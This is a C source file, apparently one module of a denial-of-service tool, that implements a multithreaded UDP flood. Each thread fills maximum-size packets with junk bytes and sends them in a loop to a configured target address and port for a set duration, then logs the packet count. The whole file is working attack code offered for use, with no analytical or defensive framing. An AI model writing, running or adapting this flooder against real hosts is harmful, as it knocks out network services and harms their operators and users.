#include "../include/elcienco.h"

extern volatile int attack_running;

void *udp_flood(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackConfig cfg = data->config;
    
    int sock = create_udp_socket();
    if (sock < 0) {
        fprintf(stderr, "[Thread %d] Failed to create UDP socket\n", data->thread_num);
        free(data);
        return NULL;
    }
    
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(cfg.port);
    target_addr.sin_addr.s_addr = inet_addr(cfg.target);
    
    char packet[MAX_PACKET_SIZE];
    memset(packet, 0xFF, MAX_PACKET_SIZE); // Fill with junk data
    
    time_t start_time = time(NULL);
    unsigned long packets_sent = 0;
    
    printf("[UDP Flood Thread %d] Started against %s:%d\n", 
           data->thread_num, cfg.target, cfg.port);
    
    while (attack_running && (time(NULL) - start_time) < cfg.duration) {
        sendto(sock, packet, MAX_PACKET_SIZE, 0, 
               (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
        
        if (packets_sent % 1000 == 0) {
            usleep(100); // Small delay to prevent CPU lock
        }
    }
    
    printf("[UDP Flood Thread %d] Finished. Packets sent: %lu\n", 
           data->thread_num, packets_sent);
    
    close(sock);
    free(data);
    return NULL;
}
